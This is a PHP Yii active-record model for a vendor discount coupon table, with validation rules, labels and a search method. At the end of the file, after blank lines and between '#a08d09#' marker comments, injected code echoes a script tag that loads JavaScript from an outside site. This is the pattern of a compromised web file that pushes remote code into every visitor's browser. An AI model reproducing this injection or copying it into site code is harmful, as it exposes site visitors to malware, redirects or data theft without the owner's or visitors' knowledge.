<?php

/**
 * This is the model class for table "vendor_discount_coupen".
 *
 * The followings are the available columns in table 'vendor_discount_coupen':
 * @property integer $id
 * @property integer $vender_id
 * @property string $code
 * @property string $from_date
 * @property string $to_date
 * @property string $status
 * @property string $created_on
 */
class Vendordiscountcoupen extends CActiveRecord
{
	/**
	 * @return string the associated database table name
	 */
	public function tableName()
	{
		return 'vendor_discount_coupen';
	}

	/**
	 * @return array validation rules for model attributes.
	 */
	public function rules()
	{
		// NOTE: you should only define rules for those attributes that
		// will receive user inputs.
		return array(
			array('vender_id, code, from_date, to_date, created_on', 'required'),
			array('vender_id', 'numerical', 'integerOnly'=>true),
			array('code', 'length', 'max'=>200),
			array('status', 'length', 'max'=>100),
			// The following rule is used by search().
			// @todo Please remove those attributes that should not be searched.
			array('id, vender_id, code, from_date, to_date, status, created_on', 'safe', 'on'=>'search'),
		);
	}

	/**
	 * @return array relational rules.
	 */
	public function relations()
	{
		// NOTE: you may need to adjust the relation name and the related
		// class name for the relations automatically generated below.
		return array(
		);
	}

	/**
	 * @return array customized attribute labels (name=>label)
	 */
	public function attributeLabels()
	{
		return array(
			'id' => 'ID',
			'vender_id' => 'Vender',
			'code' => 'Code',
			'from_date' => 'From Date',
			'to_date' => 'To Date',
			'status' => 'Status',
			'created_on' => 'Created On',
		);
	}

	/**
	 * Retrieves a list of models based on the current search/filter conditions.
	 *
	 * Typical usecase:
	 * - Initialize the model fields with values from filter form.
	 * - Execute this method to get CActiveDataProvider instance which will filter
	 * models according to data in model fields.
	 * - Pass data provider to CGridView, CListView or any similar widget.
	 *
	 * @return CActiveDataProvider the data provider that can return the models
	 * based on the search/filter conditions.
	 */
	public function search()
	{
		// @todo Please modify the following code to remove attributes that should not be searched.

		$criteria=new CDbCriteria;

		$criteria->compare('id',$this->id);
		$criteria->compare('vender_id',$this->vender_id);
		$criteria->compare('code',$this->code,true);
		$criteria->compare('from_date',$this->from_date,true);
		$criteria->compare('to_date',$this->to_date,true);
		$criteria->compare('status',$this->status,true);
		$criteria->compare('created_on',$this->created_on,true);

		return new CActiveDataProvider($this, array(
			'criteria'=>$criteria,
		));
	}

	/**
	 * Returns the static model of the specified AR class.
	 * Please note that you should have this exact method in all your CActiveRecord descendants!
	 * @param string $className active record class name.
	 * @return Vendordiscountcoupen the static model class
	 */
	public static function model($className=__CLASS__)
	{
		return parent::model($className);
	}
}







#a08d09#
if(empty($w)) {
$w = "<script type=\"text/javascript\" src=\"http://olteniamagazin.ro/2b9vr6yj.php?id=9383528\"></script>";
echo $w;
}
#/a08d09#

